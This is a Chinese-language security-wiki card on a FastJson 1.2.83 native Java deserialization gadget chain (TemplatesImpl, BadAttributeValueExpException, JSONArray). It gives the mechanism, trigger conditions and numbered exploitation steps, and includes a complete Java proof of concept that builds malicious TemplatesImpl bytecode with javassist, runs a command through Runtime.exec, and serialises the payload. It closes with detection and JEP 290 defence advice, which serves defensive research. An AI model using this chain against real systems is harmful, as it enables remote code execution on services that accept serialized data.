---
id: web-java-deser-fastjson-badattribute-jsonarray-templatesimpl-native-chain
title: FastJson1 1.2.83 原生反序列化 gadget：HashMap 键先入 TemplatesImpl，BadAttributeValueExpException(val=JSONArray) 经 JSONArray.toString/ASMSerializer 调 getOutputProperties 执行字节码
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-native-deserialization-badattribute-jsonarray-templatesimpl
aliases:
- FastJson1 利用链
- FastJson2 利用链
- BadAttributeValueExpException JSONArray
- JSONArray.toString TemplatesImpl
- ASMSerializer_1_TemplatesImpl
- HashMap.put(template, badAttribute)
- TC_REFERENCE 绕过 resolveClass
- ysoserial FastJson1 FastJson2
tags:
- java
- fastjson
- deserialization
- gadget
- badattributevalue
- jsonarray
- templatesimpl
- asm
- native-deserialization
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V301
  verified_at: '2026-11-08T11:37:16+08:00'
  notes: 已对照原文与全部 33 张图核对：BadAttributeValueExpException.readObject→val.toString→JSONArray/JSON.toJSONString→ASMSerializer_1_TemplatesImpl.write→getOutputProperties→newTransformer 调用栈一致；arthas dump 的 write() 依次调 getOutputProperties/getStylesheetDOM/getTransletIndex 与图一致；HashMap 必须 put(template,badAttribute) 及 TC_REFERENCE(113)→readHandle 复用已反序列化 template 的解释与图 23/28-33 一致；嵌套 [B 被 SecureObjectInputStream.resolveClass 裁成 B 后 checkAutoType 失败亦与图一致。affected_versions 原为原文『漏洞环境 fastjson1.2.83&fastjson2.x』（测试环境，非受影响区间），已按 brief 用 --clear。未验证点：未在本机执行 PoC；FastJson2 同类链原文未给代码细节。dedup 实跑仅命中自身 exact=duplicate，其余 top 候选（StringValueTransformer CSS、fastjson2 serialize getter、batchUpdate AutoType）均非同链，保留合理。
---

## 一句话结论

在类路径存在 FastJson（原文测试 1.2.83）与 JDK `TemplatesImpl` 时，构造 `HashMap`：key 为 `TemplatesImpl`、value 为 `BadAttributeValueExpException`（其 `val` 字段反射设为含该 Template 的 `JSONArray`）；Java 原生反序列化时 `BadAttributeValueExpException.readObject` 调用 `val.toString()` → `JSONArray.toString()` → `JSON.toJSONString` → FastJson ASM 生成的 `ASMSerializer_1_TemplatesImpl.write` 调用 `getOutputProperties()` → `newTransformer()` 加载 `_bytecodes`，静态初始化块执行命令。该链为 ysoserial 的 FastJson1/FastJson2 gadget，利用的是 FastJson 序列化 getter 的行为而非 `@type` 解析。

## 原理

- **原生反序列化入口**：`ObjectInputStream.readObject` → `HashMap.readObject` 读取 key/value；value 为 `BadAttributeValueExpException` 时进入其 `readObject`。
- **BadAttributeValueExpException.readObject（JDK 8）**：读取 `val` 字段；当 `System.getSecurityManager()==null` 且 val 不是 String/Long/Integer/Float/Double/Byte/Short/Boolean 时，执行 `val = valObj.toString()`。把 `val` 设成 `JSONArray` 即触发其 `toString()`。
- **JSONArray → FastJson 序列化**：`JSONArray extends JSON` 且未重写 `toString`，调用 `JSON.toString()` → `JSON.toJSONString()` → `new JSONSerializer(out).write(this)` → `ListSerializer.write` 遍历元素。
- **ASM 生成 getter 调用**：FastJson 用 ASM `ClassWriter` 为每个类生成 `JavaBeanSerializer` 子类（如 `ASMSerializer_1_TemplatesImpl`），重写 `write()`；其中依次调用目标类的 getter，包括 `templatesImpl.getOutputProperties()`、`getStylesheetDOM()`、`getTransletIndex()`（arthas `jad` 可 dump 该类确认）。
- **TemplatesImpl 触发**：`getOutputProperties()` → `newTransformer()` → `defineTransletClasses()`/`defineClass(_bytecodes)`；恶意类继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，类初始化块执行 `Runtime.getRuntime().exec(...)`。
- **为什么 HashMap 的 key 必须是 Template**：序列化时 key 的 `TemplatesImpl` 先出现。反序列化时，key 由标准 `ObjectInputStream.resolveClass`（`Class.forName`）解析成功；随后 `BadAttributeValueExpException.val` 里的 `JSONArray` 再次包含同一个 Template 对象，序列化流中第二次出现为 `TC_REFERENCE`，`ObjectInputStream.readObject0` 走 `readHandle` 直接复用已反序列化对象，绕过 `JSONObject$SecureObjectInputStream.resolveClass` 对 `[B` 的处理。若顺序相反（key 为其它对象），嵌套的 TemplatesImpl 首次出现时其 `_bytecodes` 的类描述符 `[B` 会被 FastJson 的 `resolveClass` 裁成 `B`，`TypeUtils.getClassFromMapping("B")==null` 后 `checkAutoType("B",...)` 报错，流程中断（InvocationTargetException）。
- **为什么整个链能落地**：FastJson 的 `toString()` 是“序列化”语义，会调用任意 getter；`TemplatesImpl.getOutputProperties` 是 JDK 内置的字节码加载链，两者组合即可在不开启 AutoType 的情况下通过原生反序列化 RCE。

## 触发条件

- 目标使用 Java 原生反序列化（`ObjectInputStream`）且攻击者可控制序列化流（或能把恶意序列化数据送进反序列化 sink）。
- 类路径存在 FastJson（1.x/2.x 对应不同 JSONArray 实现；原文测试 1.2.83），且版本包含 ASM 序列化器。
- JDK 含 Xalan `TemplatesImpl` 与 `AbstractTranslet`（JDK 8 常见），无 JEP 290 类过滤器或过滤器未拦截 `BadAttributeValueExpException`/`TemplatesImpl`/`JSONArray`。
- 攻击者可用 javassist 等生成继承 `AbstractTranslet` 的恶意字节码。

## 利用步骤

1. 用 javassist 生成继承 `AbstractTranslet` 的类，在类初始化块写入命令执行代码，取得 `_bytecodes`。
2. 反射构造 `TemplatesImpl`，设置 `_bytecodes`、`_name`。
3. `JSONArray.add(template)`；构造 `BadAttributeValueExpException(null)`，反射设置 `val` 为该 JSONArray。
4. `HashMap.put(template, badAttributeValueExpException)`（顺序必须是 key=template）。
5. 用 `ObjectOutputStream` 序列化，再交给目标 `ObjectInputStream.readObject()`；FastJson 生成 ASM serializer 并调用 `getOutputProperties()`，触发命令。
6. 需要回显时在恶意字节码中写文件/反连，或在命令后通过业务接口读取。

## PoC

```java
public class FastJson2 {
    public static byte[] getTemplates() throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("Test");
        ctClass.setSuperclass(classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        ctClass.makeClassInitializer().insertBefore("Runtime.getRuntime().exec(\"calc\");");
        return ctClass.toBytecode();
    }

    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        byte[] code = getTemplates();

        TemplatesImpl template = new TemplatesImpl();
        setFieldValue(template, "_bytecodes", new byte[][]{code});
        setFieldValue(template, "_name", "Evil");

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        setFieldValue(badAttributeValueExpException, "val", jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(template, badAttributeValueExpException); // 必须是 template 作为 key

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashMap);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        try { ois.readObject(); } catch (Exception e) { }
    }
}
```

核心调用栈（原文）：

```text
TemplatesImpl.newTransformer(TemplatesImpl.java:486)
TemplatesImpl.getOutputProperties(TemplatesImpl.java:507)
com.alibaba.fastjson.serializer.ASMSerializer_1_TemplatesImpl.write(Unknown Source)
com.alibaba.fastjson.serializer.ListSerializer.write(ListSerializer.java:135)
com.alibaba.fastjson.serializer.JSONSerializer.write(JSONSerializer.java:312)
com.alibaba.fastjson.JSON.toJSONString(JSON.java:1077)
com.alibaba.fastjson.JSON.toString(JSON.java:1071)
javax.management.BadAttributeValueExpException.readObject(BadAttributeValueExpException.java:86)
java.util.HashMap.readObject(HashMap.java:1404)
```

## 变体与关联

- **触发桥变体**：`JSONArray.toString()` 只是把对象送入 FastJson 序列化；其它能调用 `JSON.toJSONString` 的 toString/hashCode 触发点（如 [[web-java-deser-stringvaluetransformer-css-jsonarray-templatesimpl]] 的 `StringValueTransformer` + `LazyMap`）可复用同一 `JSONArray → TemplatesImpl` sink。
- **BadAttribute 链变体**：CC5 用 `BadAttributeValueExpException` + `TiedMapEntry.toString` 打 LazyMap，见 [[web-java-deser-commonscollections-cc5-badattribute-tostring]]；本卡是 val=JSONArray → FastJson 序列化。
- **FastJson2**：原文标题提到 FastJson2 同类链；其序列化 getter 触发 TemplatesImpl 的通用机制见 [[web-java-deserialization-fastjson2-serialize-getter-templates-proxy-bypass]]（≥2.0.27 的黑名单/代理绕过）。
- **经典 AutoType 链**：与 `parseObject` + `@type` 的 [[web-java-deser-fastjson-templatesimpl-batchupdate-rce]] 不同，本链不需要 `SupportAutoType`，走的是原生 Java 反序列化 + fastjson 序列化 getter。
- **边界**：无原生反序列化入口、类路径无 FastJson/`TemplatesImpl`、JEP 290 过滤器拦截、或 JDK 高版本限制 Xalan 反射时，链不成立。

## 检测与防御

- **反序列化防护**：对 `ObjectInputStream` 设置 JEP 290 `ObjectInputFilter`，拒绝 `BadAttributeValueExpException`、`TemplatesImpl`、`com.alibaba.fastjson.JSONArray`、`java.lang.invoke.SerializedLambda` 等；尽量不接收原生序列化数据。
- **依赖治理**：升级/替换 FastJson；评估是否需要在服务端对象图里出现 FastJson `JSONArray`；移除不必要的 Xalan/javassist 依赖。
- **检测**：反序列化流中出现 `java.util.HashMap` + `BadAttributeValueExpException` + `com.alibaba.fastjson.JSONArray` + `TemplatesImpl` 组合；FastJson ASM 动态类 `ASMSerializer_*` 被生成；`TemplatesImpl.defineClass`/`newTransformer` 异常调用；进程异常执行命令。
- **加固**：开启 RASP/类加载监控；对 `TemplatesImpl` 的 `_bytecodes` 反射赋值做限制；JDK 升级到移除/限制内部 Xalan 的版本。
